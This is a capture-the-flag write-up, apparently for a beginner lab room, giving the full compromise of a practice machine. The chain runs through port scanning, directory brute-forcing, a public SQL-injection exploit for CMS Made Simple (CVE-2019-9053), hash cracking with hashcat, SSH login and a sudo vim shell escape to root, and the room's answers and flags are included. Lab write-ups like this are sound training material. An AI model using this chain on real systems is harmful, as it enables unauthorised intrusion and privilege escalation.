After deploing machine, started to use nmap to look for open ports:

```
nmap -p- -sV -sS -sC -Pn 10.10.134.88

PORT     STATE SERVICE VERSION                                                                                                                                                                                                              
21/tcp   open  ftp     vsftpd 3.0.3                                                                                                                                                                                                         
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                      
|_Can't get directory listing: TIMEOUT                                                                                                                                                                                                      
| ftp-syst:                                                                                                                                                                                                                                 
|   STAT:                                                                                                                                                                                                                                   
| FTP server status:                                                                                                                                                                                                                        
|      Connected to ::ffff:10.23.140.77                                                                                                                                                                                                     
|      Logged in as ftp                                                                                                                                                                                                                     
|      TYPE: ASCII                                                                                                                                                                                                                          
|      No session bandwidth limit                                                                                                                                                                                                           
|      Session timeout in seconds is 300                                                                                                                                                                                                    
|      Control connection is plain text                                                                                                                                                                                                     
|      Data connections will be plain text                                                                                                                                                                                                  
|      At session startup, client count was 2                                                                                                                                                                                               
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                                                                  
|_End of status                                                                                                                                                                                                                             
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                                                       
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                                
| http-robots.txt: 2 disallowed entries                                                                                                                                                                                                     
|_/ /openemr-5_0_1_3                                                                                                                                                                                                                        
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                                                                                         
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                                                                                         
| ssh-hostkey:                                                                                                                                                                                                                              
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)                                                                                                                                                                              
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)                                                                                                                                                                             
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)                                                                                                                                                                           
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel               

```
How many services are running under port 1000?

Answer:2

What is running on the higher port?

Answer: ssh


then used gobuster to search for directories

```
$ gobuster dir -u http://10.10.134.88  -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.134.88
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 300]
/simple               (Status: 301) [Size: 313] [--> http://10.10.134.88/simple/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
Now lets look for vulnerabilyti:
Identified CMS version (e.g., 2.2.8).
```
searchsploit "CMS Made Simple 2.2.8"
Found CVE-2019-9053 — SQL Injection (ExploitDB ID 46635)
```
What's the CVE you're using against the application? 

Answer:CVE-2019-9053

To what kind of vulnerability is the application vulnerable?

Answer:sqli


download it
```
searchsploit -m 46635
Exploit requires Python2 and the termcolor lib

sudo pip2 install termcolor

```
lets run it 
```
python2 46635.py -u http://<TARGET_IP>/simple
Result: Retrieved username (mitch), hash, and salt.
```
in Answer we got user:mitch and password as hash

lets crack it
```
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

What's the password?

Answer:secret


Where can you login with the details obtained?

Answer:ssh

Now that we have password we can access to machine using ssh

```
$ ssh mitch@10.10.134.88 -p 2222     
The authenticity of host '[10.10.134.88]:2222 ([10.10.134.88]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.134.88]:2222' (ED25519) to the list of known hosts.
mitch@10.10.134.88's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls -al
total 36
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
$ cat user.txt  
G00d j0b, keep up!

$ ls /home
mitch  sunbath

```
we got first flag 

What's the user flag?

Answer: G00d j0b, keep up!

Is there any other user in the home directory? What's its name?

Answer:sunbath

now lets use Privilege Escalation to get root access

```
 sudo vim -c ':!/bin/bash

root@Machine:~# whoami
root
root@Machine:~# 
root@Machine:~# ls /root
root.txt
root@Machine:~# 
root@Machine:~# cat /root/root.txt
W3ll d0n3. You made it!

```
What can you leverage to spawn a privileged shell?

Answer:vim

Yup! we got root flag

What's the root flag?

W3ll d0n3. You made it!
